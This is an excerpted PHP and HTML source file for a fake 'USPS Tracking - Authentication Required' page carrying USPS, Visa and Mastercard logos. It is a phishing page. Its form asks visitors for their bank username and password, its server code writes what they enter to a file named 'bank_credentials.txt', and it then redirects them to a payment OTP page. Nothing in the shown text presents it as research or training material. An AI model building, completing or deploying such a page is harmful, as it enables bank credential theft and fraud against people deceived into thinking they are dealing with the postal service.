...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ...
    if (empty($errors)) {
        ...
        if (saveUserData('bank_credentials.txt', $data)) {
            // Redirect to OTP page
            header('Location: payment-otp.php');
            exit;
        } else {
            $errors['form'] = 'There was an error verifying your credentials. Please try again.';
        }
    }
}
?>
...
<head>
    ...
    <title>USPS Tracking - Authentication Required</title>
                ...
                <div class="mt-12 space-y-12">
                    ...
                    <section class="space-y-5">
                        ...
                        <div class="mt-4 flex w-full max-w-[760px]">
                            ...
                            <div class="h-[14px]" style="flex-grow: 1; flex-basis: 0; background: #d9d9df; clip-path: polygon(8px 0, 100% 0, calc(100% - 8px) 100%, 0 100%); margin-right: 4px;"></div>
                            <div class="h-[14px]" style="flex-grow: 1; flex-basis: 0; background: #d9d9df; clip-path: polygon(8px 0, 100% 0, 100% 100%, 0 100%);"></div>
                        </div>
                    ...
                    <!-- Authentication Form -->
                    <section>
                        <div class="text-[17px] font-semibold text-[#23285a] mb-5">Authentication Required</div>
                        <div class="max-w-[420px] mx-auto bg-white border border-[#d8d8e0] shadow-sm rounded-md px-6 py-8 space-y-5">
                            <div class="flex items-center justify-between">
                                <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa" class="h-5 object-contain" />
                                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="Mastercard" class="h-5 object-contain" />
                                <img src="assets/logo-sb.svg" alt="USPS" class="h-6 object-contain" />
                            </div>
                            <p class="text-[13px] leading-6 text-center text-[#4a4f6d]">
                            ...
                            <div class="space-y-1 text-[13px] text-[#1a2252]">
                                    ...
                                    <div class="flex">
                                        ...
                                        <div class="ml-3">
                                            <p class="text-sm text-red-700">
                                                <?php echo htmlspecialchars($errors['form'] ?? 'Please fix the errors below.'); ?>
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            ...
                            <form method="POST" action="" class="space-y-3">
                                <div>
                                    <label class="block text-[12px] text-[#1a2252] font-semibold mb-1" for="bank-user">
                                        Bank ID (username)
                                    </label>
                                    <input
                                        id="bank-user"
                                        type="text"
                                        name="bankUsername"
                                        class="w-full border border-[#3d4095] rounded-sm px-4 py-2.5 text-[14px] text-[#1a2252] placeholder:text-[#757cab] bg-white focus:outline-none focus:ring-1 focus:ring-[#2b2a72]/40 focus:border-[#2b2a72]"
                                        placeholder="Enter bank username"
                                        value="<?php echo htmlspecialchars($_POST['bankUsername'] ?? ''); ?>"
                                        required
                                    />
                                    <?php if (isset($errors['bankUsername'])): ?>
                                        <p class="mt-1 text-xs text-red-600"><?php echo htmlspecialchars($errors['bankUsername']); ?></p>
                                    <?php endif; ?>
                                </div>
                                <div>
                                    <label class="block text-[12px] text-[#1a2252] font-semibold mb-1" for="bank-pass">
                                    ...
                                    <input
                                        ...
                                        value="<?php echo htmlspecialchars($_POST['bankPassword'] ?? ''); ?>"
                                        required
                                    />
                                    <?php if (isset($errors['bankPassword'])): ?>
                                        <p class="mt-1 text-xs text-red-600"><?php echo htmlspecialchars($errors['bankPassword']); ?></p>
                                    <?php endif; ?>
                                </div>
                                <button
                                    type="submit"
                                    class="mt-4 inline-flex items-center justify-center bg-[#2b2a72] text-white font-semibold px-10 py-3 text-[15px] tracking-wide rounded-sm hover:bg-[#211f5a] transition-colors w-full"
                                >
                                    Submit
                                </button>
                            </form>
                            <p class="text-center text-[11px] text-[#6b6f88]">Copyright © 1999-2025 USPS. All rights reserved.</p>
                        </div>
                    </section>
                </div>
            </div>
